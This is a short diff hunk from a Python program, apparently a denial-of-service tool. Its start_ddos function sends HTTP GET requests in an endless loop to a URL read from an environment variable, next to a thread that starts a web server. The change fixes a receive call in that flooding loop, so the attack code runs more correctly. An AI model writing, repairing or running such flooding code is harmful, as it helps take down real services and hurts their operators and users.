@@ -2589,7 +2589,7 @@ def start_ddos():
   message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(os.environ.get("url"))
   while True:
     s.send(message.encode())
-    data = client.recv(4096)
+    data = s.recv(4096)
 
 thread1 = threading.Thread(target=start_web)
 thread2 = threading.Thread(target=start_ddos)
